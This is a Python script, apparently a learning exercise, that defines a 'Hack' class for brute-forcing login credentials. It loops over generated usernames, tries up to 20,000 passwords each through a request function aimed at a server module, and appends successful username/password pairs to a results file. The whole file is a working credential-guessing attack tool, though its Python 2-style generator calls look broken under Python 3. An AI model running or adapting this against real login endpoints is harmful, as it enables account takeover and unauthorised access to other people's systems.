from generators import simple_login_generator, \
    simple_password_generator, \
    popular_password_generator, \
    brute_force_generator
from requesters import myserver


class Hack:

    def __init__(self,
                 login_generator=None,
                 password_generator=None,
                 request=None,
                 limit_passwords_per_login=100,
                 result_filename='result.txt'):
        """
        Create a Hacker:
        :param login_generator: fn generates logins
        :param password_generator: fn generates passwords
        :param request: fn doing a request
        :param limit_passwords_per_login: requests per one login
        :param result_filename: here will be the resultes
        """
        self.login_generator = login_generator
        self.password_generator = password_generator
        self.request = request
        self.limit_passwords_per_login = limit_passwords_per_login
        self.result_filename = result_filename

    def attack(self):
        login_generator = self.login_generator()
        login = login_generator.next()
        while login is not None:

            password_generator = self.password_generator()
            for i in range(self.limit_passwords_per_login):
                password = password_generator.next()
                if password is None:
                    break
                print(f'Trying {login=} {password=} ...')
                success = self.request(login, password)
                if success:
                    print(f'SUCCESS! {login=} {password=}')
                    with open(self.result_filename, 'a') as result_file:
                        result_file.write(f'{login=} {password=}\n')
                        break

            login = login_generator.next()

        # with open(self.result_filename, 'a') as result_file:
        #     result_file.write('login: l1, password: 123\n')
        # print('There will be attack code')


hack = Hack(login_generator=simple_login_generator.Generator,
            # password_generator=simple_password_generator.Generator,
            # password_generator=popular_password_generator.Generator,
            password_generator=brute_force_generator.Generator,
            request=myserver.request,
            limit_passwords_per_login=20000)
hack.attack()

# print(hack.result_filename)
